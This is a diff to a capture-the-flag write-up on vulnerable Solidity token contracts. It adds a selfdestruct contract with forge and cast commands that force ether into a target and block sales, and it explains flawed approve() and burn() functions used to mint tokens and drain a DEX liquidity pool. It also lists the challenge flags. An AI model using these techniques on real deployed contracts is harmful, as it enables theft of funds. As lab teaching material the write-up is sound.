@@ -144,6 +144,8 @@ $ cast send 0xCDC73DEF312bBc279f999D8Fe97df5556dAdd395 0x75ec067a --rpc-url $RPC
 
 Challenge Briefing: *"There's an ERC20 out there, and a villain has his dirty money stashed in it. Your mission, should you choose to accept it, is to prevent this villain from reclaiming his ill-gotten gains. Remember, this ERC20 is a lone wolf, not linked to any swap. Your path to victory? Block all sales and grab the flag!"*
 
+There is no foundry script or test as i solve it only using cli, but you can recreate the test and script taking example on other challenges.
+
 Here's a sneak peek into the source code:
 
 ```js
@@ -203,9 +205,44 @@ contract  hero2303
 
 Here's the plan of action: We'll be the crafty heroes and concoct another smart contract. Then, we'll hit the self-destruct button on the 'hero2303' contract. It's a dirty job, but someone's got to do it.
 
+Smart contract use for the attack : 
+
+```js
+pragma solidity 0.8.17;
+
+contract Selfdestruct{
+    constructor() payable{
+        require(msg.value == 0.5 ether);
+    }
+
+    function kill(address addr) public {
+        selfdestruct(payable(addr));
+    }
+}
+```
+
+Foundry cli to deploy Selfedestruct and execute the kill(...) function : 
+
+To deploy :
+```bash
+forge create src/selfdestruct.sol:Selfdestruct --value 0.5ether --rpc-url $RPC_URL --private-key $PRIVATE_KEY
+```
+This return the `Selfdestrcut` addresse, thus, we can cast the kill function : 
+```bash
+cast send 0x[Selfdestruct] "kill(address)" 0x[target address] --rpc-url $RPC_URL --private-key $PRIVATE_KEY
+```
+
 Post-destruction, the statement `assert(getEtherBalance() == totalSupply * TOKEN_PRICE);` will always return false. This means the 'sell' function will hit a wall every single time.
 
-*Hero{S4m3_aS_USU4L_bUT_S3eN_IRL??!}*
+Flag : *Hero{S4m3_aS_USU4L_bUT_S3eN_IRL??!}*
+
+## A little stop here top explain important informations for futher challenges
+
+
+
+The 3 next challenge are DEXs working like uniswap. Here are valuable things to learn of uniswap work : [whiteboard crypto video](https://www.youtube.com/watch?v=dVJzcFDo498&list=PLHx4UicbtUoYvCvRouZ4XbaDpE7cbCCqo&ab_channel=WhiteboardCrypto) and [official docs](https://docs.uniswap.org/contracts/v2/concepts/core-concepts/pools). All of these challenges are about an erc20 vulnerable smart contract, we will use these vulnerability to get arbitrary amount of these erc20 and thus, hacking a liquidity Pool with our token erc20 and another erc20 : WMEL. To goal of these futher challenges are to empty the pool of WMEL token. Initialy there are 20 WMEL and X erc20 vulnerable token, we need to lower the liquidity of WMEL under 0.5 WMEL.
+
+
 
 ## Challenge 02 : Dive into real life stuff
 
@@ -213,7 +250,7 @@ Challenge Briefing: *"If you're at this point, you're probably Solidity fluent S
 There is a DEX ! This ERC20 will be deployed as a pair on it.
 Steal the money ! It has to have less that 0.5 WMEL liquidities."*
 
-This is the source code : 
+The source code : 
 
 ```js
 // SPDX-License-Identifier: MIT
@@ -298,7 +335,9 @@ contract hero2302 is IERC20 {
 
 ```
 
-As you can see the `approve(uint)` function allow to get arbitrary balance : 
+As you can see the `approve(uint)` function allow to get arbitrary balance: 
+
+The line `balanceOf[msg.sender] = amount;` is the key here.
 
 ```js
 function approve(uint amount) external returns (bool)
@@ -311,9 +350,9 @@ function approve(uint amount) external returns (bool)
 
 Call it, and voila! You've hit the jackpot! You can now drain the entire pool of funds.
 
-For a detailed view of this operation, check out the Foundry [test](https://chat.openai.com/test/chall02.t.sol) and [script](https://chat.openai.com/script/chall02/Exploitoor.s.sol) that provide an play-by-play of the exploit.
+For a detailed view of this operation on how to empty the pool, check out the Foundry [test](https://chat.openai.com/test/chall02.t.sol) and [script](https://chat.openai.com/script/chall02/Exploitoor.s.sol) that provide an play-by-play of the exploit.
 
-*Hero{Th1s_1_w4s_3z_bro}*
+Flag : *Hero{Th1s_1_w4s_3z_bro}*
 
 ## Challenge 03 : You have to be kidding me..
 
@@ -331,11 +370,22 @@ function sub(uint256 a, uint256 b) internal pure returns (uint256) {
         return a + b;
     }
 ```
+
+Thus the burn(...) function increase the balance instead of reduce it : 
+```js
+function burn(uint amount) external {
+        balanceOf[msg.sender] = balanceOf[msg.sender].sub(amount); 
+        totalSupply.sub(amount);
+
+        emit Transfer(msg.sender, address(0), amount);
+}
+```
+
 Call it, and bam! The vault is yours to empty! 
 
 For an eye-popping, step-by-step walkthrough of this exploit, you'd definitely want to check out the Foundry [test](https://chat.openai.com/test/chall03.t.sol) and [script](https://chat.openai.com/script/chall03/Exploitoor.s.sol).
 
-*Hero{H0w_L0ng_D1d_1t_T4k3_U_?..lmao}*
+Flag : *Hero{H0w_L0ng_D1d_1t_T4k3_U_?..lmao}*
 
 ## Challenge 04 : Now this is real life
 
@@ -351,7 +401,7 @@ The gears of our minds start turning rapidly. An initial attempt to use the `min
 
 Feeling emboldened, we give the `mint` function another whirl, and this time, it works like a charm! The rest, as they say, is a piece of cake. Drain the pool, celebrate the victory, and bask in the glory of your success!
 
-The captured flag waves proudly in the wind: *Hero{S0_Ur_4_r3AL_hUnT3r_WP_YMI!!!}*
+Flag : *Hero{S0_Ur_4_r3AL_hUnT3r_WP_YMI!!!}*
 
 
 ## Thanks for watching 
